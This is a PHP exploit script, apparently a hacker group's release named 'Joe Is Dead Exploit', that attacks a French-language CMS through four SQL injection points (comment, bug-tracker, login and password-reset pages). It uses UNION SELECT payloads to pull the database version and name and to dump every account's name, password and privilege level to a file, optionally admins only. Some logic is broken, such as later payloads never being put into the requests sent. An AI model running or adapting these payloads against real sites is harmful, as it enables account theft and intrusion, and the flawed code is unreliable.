<?php
/*
!JID
@ HOST = localhost = Target URL
@ PATH = / = Web site path
@ MODE = 1 = Injection mode
@ FILE = txt = Save type
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
if ($argc < 5)
{
    print "\nUsage......: php $argv[0] <host> <path> <save>\n";
    print "\nExample....: php $argv[0] localhost / 1 txt ";
    print "\nExample....: php $argv[0] localhost /site/ 3 sql \n";
    die();
}

$host = $argv[1];
$path = $argv[2];
$mode = $argv[3];
$file = $argv[4];

$exploitM = 0;
function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80)))
        die("\n[-] No response from {$host}:80\n");
 
    fputs($sock, $packet);
    return stream_get_contents($sock);
}
function write_txt($file, $account, $pass, $level)
{
	$save_file = fopen("".$file."", "a+"); 
	fwrite($save_file, "$account:$pass:$level\n");
	fclose($save_file);
}
function write_sql($file, $account, $pass, $level)
{
	$save_file = fopen("".$file."", "a+");
	fwrite($save_file, "INSERT INTO 'account_inj' VALUES ('$account', '$pass', '$level')\n");
	fclose($save_file);
}
function fetch_data($page)
{
	$debut = "~'";
	$debutTxt = strpos( $page, $debut ) + strlen( $debut ); 
	$fin = "'~";
	$finTxt = strpos( $page, $fin ); 
	$data_fetch = substr($page, $debutTxt, $finTxt - $debutTxt ); 
	return $data_fetch;
}
function get_page($link)
{
return file_get_contents($link);
}

print "\n+---------------------------------------------------------------+";
print "\n|                 .:[The Cr4zY3D Team]:.                        |";
print "\n|                                                               |";
print "\n| Joe Is Dead Exploit by The UnKn0wN                            |";
print "\n|                                                               |";
print "\n|                                                               |";
print "\n| First, test the CMS, then use the others modes.               |";
print "\n|                                                               |";
print "\n| Mode 1: get all the accounts                                  |";
print "\n| Mode 2:  get only the gm accounts                             |";
print "\n| Save options:  'sql' to save the accounts into a sql file     |";
print "\n|                'txt' to save the accounts into a text file    |";
print "\n+---------------------------------------------------------------+\n";
 


function inject($host,$path,$mode)
{



/*Faille 1*/

$syntax = "1";
$page = get_page("http://".$host."".$path."commentaire.php?news='{$syntax}");
if(!(preg_match("#You have an error in your SQL syntax#", $page))) {print "[-]CMS not vulnerable\n";}
else {print ("[+]CMS can be exploited!\n"); 
$syntax = "UNION%20ALL%20SELECT%20concat(0x7e27,@@version,0x277e),2,3,4,5%20AND%20'1'<>'2";
$page = get_page("http://".$host."".$path."commentaire.php?news='{$syntax}");
print "MySQL version : ".fetch_data($page)."\n"	;
$syntax = "UNION%20ALL%20SELECT%20concat(0x7e27,database(),0x277e),2,3,4,5%20AND%20'1'<>'2";
$page = get_page("http://".$host."".$path."commentaire.php?news='{$syntax}");
print "Database : ".fetch_data($page)."\n";
$req ="";
if ( $mode ==1) {$req ="";$text="Accounts Number :";} else{$req ="%20WHERE%20level>0%20";$text="Admin Accounts Number :";}
$syntax = "UNION%20ALL%20SELECT%20(select%20concat(0x7e27,COUNT(*),0x277e)%20FROM%20accounts".$req."),2,3,4,5%20AND%20'1'<>'2";
$page = get_page("http://".$host."".$path."commentaire.php?news='{$syntax}");
$Number = fetch_data($page);
print $text.$Number."\n";

for($i=0;$i<$Number;$i++)
{
$syntax = "UNION%20ALL%20SELECT%20(select%20concat(0x7e27,account,0x7c,pass,0x7c,level,0x277e)%20FROM%20accounts".$req."),2,3,4,5%20AND%20'1'<>'2";
$page = get_page("http://".$host."".$path."commentaire.php?news='{$syntax}");
list($account, $pass, $level) = split('[|]', fetch_data($page));
	print "Account: $account Pass: $pass  Level: $level\n";
	if($file == "accounts.txt") 
		write_txt($file, $account, $pass, $level);			
	else 
		write_sql($file, $account, $pass, $level);
}
die();
 }

print "[!]Changing Injection methode ... \n";
/*FAille 2*/
$page = get_page("http://".$host."".$path."bugtraker.php?ticket='BHR");
if(!(preg_match("#You have an error in your SQL syntax#", $page))) {print "[-]CMS not vulnerable\n";}
else {print ("[+]CMS can be exploited!\n");

$syntax = "UNION%20ALL%20SELECT%201,2,3,4,5,concat(0x7e27,@@version,0x277e),7%20AND%20'1'<>'2";
$page = get_page("http://".$host."".$path."bugtraker.php?ticket='{$syntax}");
print "MySQL version : ".fetch_data($page)."\n"	;
$syntax = "UNION%20ALL%20SELECT%201,2,3,4,5,concat(0x7e27,database(),0x277e),7%20AND%20'1'<>'2";
$page = get_page("http://".$host."".$path."bugtraker.php?ticket='{$syntax}");
print "Database : ".fetch_data($page)."\n";
$req ="";
if ( $mode ==1) {$req ="";$text="Accounts Number :";} else{$req ="%20WHERE%20level>0%20";$text="Admin Accounts Number :";}
$syntax = "UNION%20ALL%20SELECT%201,2,3,4,5,(select%20concat(0x7e27,COUNT(*),0x277e)%20FROM%20accounts".$req."),7%20AND%20'1'<>'2";
$page = get_page("http://".$host."".$path."bugtraker.php?ticket='{$syntax}");
$Number = fetch_data($page);
print $text.$Number."\n";

for($i=0;$i<$Number;$i++)
{
$syntax = "UNION%20ALL%20SELECT%201,2,3,4,5,(select%20concat(0x7e27,account,0x7c,pass,0x7c,level,0x277e)%20FROM%20accounts".$req."),7%20AND%20'1'<>'2";
$page = get_page("http://".$host."".$path."bugtraker.php?ticket='{$syntax}");
list($account, $pass, $level) = split('[|]', fetch_data($page));
	print "Account: $account Pass: $pass  Level: $level\n";
	if($file == "accounts.txt") 
		write_txt($file, $account, $pass, $level);			
	else 
		write_sql($file, $account, $pass, $level);
}
die();
 }
 
 print "[!]Changing Injection methode ... \n";
 
 /*Faille 3*/
$syntax = "1";
$payload = "username='{$syntax}&password=TheUnKn√?wN&&send= ";
$packet  = "POST {$path}login.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Connection: keep-alive\r\n\r\n{$payload}";

$page = http_send($host, $packet);
if(!(preg_match("#You have an error in your SQL syntax#",$page))) print "[-]CMS not vulnerable\n";
else {print ("[+]CMS can be exploited!\n");
$syntax = "UNION+SELECT+1,2,3,4,5,6,7,8,(concat(0x7e27,@@version,0x277e)),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28+and+'1'<>'2";
$page = http_send($host, $packet);
print "MySQL Version : ".fetch_data($page);

$syntax = "UNION SELECT 1,2,3,4,5,6,7,8,(concat(0x7e27,database(),0x277e)),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 and '1'<>'2";
$page = http_send($host, $packet);
print "Database : ".fetch_data($page);

$req ="";
if ( $mode ==1) {$req ="";$text="Accounts Number :";} else{$req ="%20WHERE%20level>0%20";$text="Admin Accounts Number :";}
$syntax = "UNION SELECT 1,2,3,4,5,6,7,8,(select concat(0x7e27,COUNT(*),0x277e) FROM accounts".$req."),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 and '1'<>'2";
$page = http_send($host, $packet);
$Number = fetch_data($page);
print $text.$Number."\n";
for($i=0;$i<$Number;$i++)
{
$syntax = "UNION SELECT 1,2,3,4,5,6,7,8,(select concat(0x7e27,account,0x7c,pass,0x7c,level,0x277e) FROM accounts".$req."),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 and '1'<>'2";
$page = http_send($host, $packet);
list($account, $pass, $level) = split('[|]', fetch_data($page));
	print "Account: $account Pass: $pass  Level: $level\n";
	if($file == "accounts.txt") 
		write_txt($file, $account, $pass, $level);			
	else 
		write_sql($file, $account, $pass, $level);
}
die();
}


print "[!]Changing Injection methode ... \n";
 
 /*Faille 4*/
$syntax = "1";
$payload = "ndc='{$syntax}";
$packet  = "POST {$path}mdpoublie.php?etape=2 HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Connection: keep-alive\r\n\r\n{$payload}";

$page = http_send($host, $packet);
if(!(preg_match("#You have an error in your SQL syntax#",$page))) {print "[-]CMS not vulnerable\n";}
else {print ("[+]CMS can be exploited!\n");
$syntax = "UNION SELECT 1,2,3,4,5,6,7,8,(concat(0x7e27,@@version,0x277e)),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 and '1'<>'2";
$page = http_send($host, $packet);
print "MySQL Version : ".fetch_data($page);

$syntax = "UNION SELECT 1,2,3,4,5,6,7,8,(concat(0x7e27,database(),0x277e)),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 and '1'<>'2";
$page = http_send($host, $packet);
print "Database : ".fetch_data($page);

$req ="";
if ( $mode ==1) {$req ="";$text="Accounts Number :";} else{$req ="%20WHERE%20level>0%20";$text="Admin Accounts Number :";}
$syntax = "UNION SELECT 1,2,3,4,5,6,7,8,(select concat(0x7e27,COUNT(*),0x277e) FROM accounts".$req."),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 and '1'<>'2";
$page = http_send($host, $packet);
$Number = fetch_data($page);
print $text.$Number."\n";
for($i=0;$i<$Number;$i++)
{
$syntax = "UNION SELECT 1,2,3,4,5,6,7,8,(select concat(0x7e27,account,0x7c,pass,0x7c,level,0x277e) FROM accounts".$req."),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 and '1'<>'2";
$page = http_send($host, $packet);
list($account, $pass, $level) = split('[|]', fetch_data($page));
	print "Account: $account Pass: $pass  Level: $level\n";
	if($file == "accounts.txt") 
		write_txt($file, $account, $pass, $level);			
	else 
		write_sql($file, $account, $pass, $level);
}
die();
}

}


inject($host,$path,$mode);
	
?>
